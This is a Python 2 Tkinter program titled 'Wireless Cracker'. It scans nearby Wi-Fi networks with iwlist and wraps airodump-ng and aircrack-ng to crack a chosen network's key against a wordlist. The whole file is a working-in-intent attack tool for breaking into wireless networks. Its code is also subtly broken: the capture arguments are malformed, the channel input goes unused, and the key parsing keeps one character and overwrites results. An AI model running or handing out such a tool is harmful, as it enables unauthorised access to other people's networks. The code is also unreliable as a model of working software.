import Tkinter, tkFileDialog
import subprocess, time

class wcGUI(Tkinter.Tk):
   def __init__(self, parent):
	Tkinter.Tk.__init__(self, parent)
	self.parent=parent
	self.initialise()

   def initialise(self):
	self.grid()

	scrollbar=Tkinter.Scrollbar(self)
	self.textbox=Tkinter.Text(self)
	scrollbar.config(command=self.textbox.yview)
	self.textbox.config(yscrollcommand=scrollbar.set)
	self.textbox.grid(column=0, row=0, rowspan=2)

	scanbutton=Tkinter.Button(self, text=u"Scan", command=self.OnScan)
	scanbutton.grid(column=1, row=0)

	crackbutton=Tkinter.Button(self, text=u"Crack", command=self.OnCrack)
	crackbutton.grid(column=1, row=1)

   def OnScan(self):
	command=['iwlist', 'wlan0', 'scan']
	output=subprocess.Popen(command, stdout=subprocess.PIPE).stdout.readlines()
	data=[]
	wifiFile=open("wifiReport.txt", "w+")

	for item in output:
	   wifiFile.write(item)
	self.textbox.insert(Tkinter.END, "The results of the scan can be found in: wifiReport.txt")
	self.textbox.update_idletasks()

   def OnCrack(self):
	def OnCrackButtonClick():
		ssid=ssidVariable.get()
		apmac=macVariable.get()
		channel=channelVariable.get()
		interface=interfaceVariable.get()
		passfile=wordentryVariable.get()
	
		airodumpcmd=['airodump-ng','-w psk',interface]
		airodumpout=subprocess.Popen(airodumpcmd, shell=True)
		time.sleep(10)
		aircrackcmd=['aircrack-ng','-w'+passfile,'-b'+apmac,' psk*.cap']
		aircrackout=subprocess.Popen(aircrackcmd, stdout=subprocess.PIPE).stdout.readlines()
		
		for item in aircrackout:
		   item=item.strip()
		   keyPos=item.find("KEY FOUND:")
		   if keyPos>0:
			key=item[keyPos]
		   else:
			key="Key not found."
		self.textbox.insert(Tkinter.END, ""+ssid+": "+key)
		self.textbox.update_idletasks()

	def OnWordButtonClick():
		global word_file_path
		word_file_path=tkFileDialog.askopenfilename()
		wordentryVariable.set(word_file_path)

	dialogueInterface=Tkinter.Toplevel(self)
	dialogueInterface.grid()
	dialogueInterface.wm_title("Crack Wireless Dialogue Box")

	ssidVariable=Tkinter.StringVar()
	ssid=Tkinter.Entry(dialogueInterface, textvariable=ssidVariable, width=50)
	ssid.grid(column=0, row=0, sticky='EW')
	ssidVariable.set(u"Please enter the SSID")

	macVariable=Tkinter.StringVar()
	mac=Tkinter.Entry(dialogueInterface, textvariable=macVariable, width=50)
	mac.grid(column=0, row=1, sticky='EW')
	macVariable.set(u"Please enter the MAC")

	wordentryVariable=Tkinter.StringVar()
	wordentry=Tkinter.Entry(dialogueInterface, textvariable=wordentryVariable, width=50)
	wordentry.grid(column=0, row=2, sticky='EW')
	wordentryVariable.set(u"Please choose a word list")

	wfilebutton=Tkinter.Button(dialogueInterface, text=u"Choose File", command=OnWordButtonClick)
	wfilebutton.grid(column=1, row=2)

	channelVariable=Tkinter.StringVar()
	channel=Tkinter.Entry(dialogueInterface, textvariable=channelVariable)
	channel.grid(column=0, row=3, sticky='EW')
	channelVariable.set(u"Please enter the channel number")

	interfaceVariable=Tkinter.StringVar()
	interface=Tkinter.Entry(dialogueInterface, textvariable=interfaceVariable)
	interface.grid(column=0, row=4, sticky='EW')
	interfaceVariable.set(u"Please enter the wireless interface name")

	crackbutton=Tkinter.Button(dialogueInterface, text=u"Crack", command=OnCrackButtonClick)
	crackbutton.grid(column=0, row=5)

if __name__=="__main__":
   app=wcGUI(None)
   app.title('Wireless Cracker')
   app.mainloop()
